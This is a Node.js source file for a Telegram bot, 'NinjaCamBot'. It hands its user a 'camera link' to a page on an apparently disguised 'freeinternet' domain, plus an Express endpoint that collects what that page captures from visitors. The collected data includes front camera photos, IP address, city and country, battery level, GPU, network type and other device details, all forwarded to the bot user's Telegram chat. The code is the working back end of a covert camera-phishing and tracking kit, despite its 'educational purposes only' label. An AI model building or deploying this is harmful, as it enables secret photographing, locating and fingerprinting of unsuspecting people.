import TelegramBot from "node-telegram-bot-api";
import express from 'express';
import cors from 'cors';
import fetch from 'node-fetch';

const BOT_TOKEN = process.env.BOT_TOKEN; 
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

const app = express();
app.use(cors());
app.use(express.json({ limit: '50mb' }));

console.log("🚀 Bot is Running via Railway with API Endpoints");

// Existing bot commands
bot.on("message", async (msg) => {
  const chat_id = msg.chat.id;
  const text = msg.text;

  if (text === "/start") {
    return bot.sendMessage(chat_id,
`👋 Welcome to NinjaCamBot (Railway Mode)
Use /create to get your camera link.`);
  }

  if (text === "/create") {
    const baseUrl = "https://freeinternet-seven.vercel.app";
    const link = `${baseUrl}/?chatid=${chat_id}`;

    return bot.sendMessage(chat_id,
`🎯 Your Camera Link:
🔗 ${link}

Open it and wait 5 seconds ✅`, {
      reply_markup: {
        inline_keyboard: [
          [{ text: "Open Link ✅", url: link }]
        ]
      }
    });
  }

  bot.sendMessage(chat_id, "⚡ Command List:\n/start\n/create");
});

// NEW: API endpoint to handle camera data
app.post('/api/capture', async (req, res) => {
    try {
        const { chatId, type, deviceInfo, photoData, timestamp } = req.body;
        
        console.log(`📱 Received data from chat ${chatId}, type: ${type}`);

        let caption = `📱 *${type === 'photo' ? 'Camera Capture' : 'Device Info'}* - @sgmodderpro\n\n`;

        caption += `👤 *User Information:*\n`;
        caption += `🆔 Chat ID: ${chatId}\n`;
        caption += `🌐 IP: ${deviceInfo.ip}\n`;
        caption += `📍 Location: ${deviceInfo.city}, ${deviceInfo.country}\n`;
        caption += `📱 Device: ${deviceInfo.deviceType}\n`;
        caption += `🔋 Battery: ${deviceInfo.batteryLevel}% ${deviceInfo.isCharging ? '⚡Charging' : ''}\n\n`;

        caption += `💻 *Device Details:*\n`;
        caption += `🖥️ Screen: ${deviceInfo.screenSize}\n`;
        caption += `📊 Viewport: ${deviceInfo.viewportSize}\n`;
        caption += `⚙️ Pixel Ratio: ${deviceInfo.pixelRatio}\n`;
        caption += `💻 CPU Cores: ${deviceInfo.cpuCores}\n`;
        caption += `🎮 GPU: ${deviceInfo.gpu}\n`;
        caption += `🌐 Browser: ${deviceInfo.browser}\n`;
        caption += `📶 Network: ${deviceInfo.networkType} (${deviceInfo.networkSpeed} Mbps)\n\n`;

        caption += `🌍 *System Info:*\n`;
        caption += `🕒 Timezone: ${deviceInfo.timezone}\n`;
        caption += `🗣️ Language: ${deviceInfo.language}\n`;
        caption += `🔧 Platform: ${deviceInfo.platform}\n\n`;

        caption += `${type === 'photo' ? '✅ Front camera photo captured' : '⚠️ Camera access denied'}\n\n`;
        caption += `⚡ *Powered by SG Modder Pro*\n`;
        caption += `🔒 *Educational purposes only*`;

        if (type === 'photo' && photoData) {
            // Convert base64 to buffer
            const base64Data = photoData.replace(/^data:image\/jpeg;base64,/, '');
            const imageBuffer = Buffer.from(base64Data, 'base64');
            
            // Send photo to Telegram
            await bot.sendPhoto(chatId, imageBuffer, {
                caption: caption,
                parse_mode: 'Markdown'
            });
        } else {
            // Send message only
            await bot.sendMessage(chatId, caption, {
                parse_mode: 'Markdown'
            });
        }

        res.status(200).json({ success: true, message: 'Data sent to Telegram' });
        
    } catch (error) {
        console.error('API Error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Start Express server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Backend API running on port ${PORT}`);
});
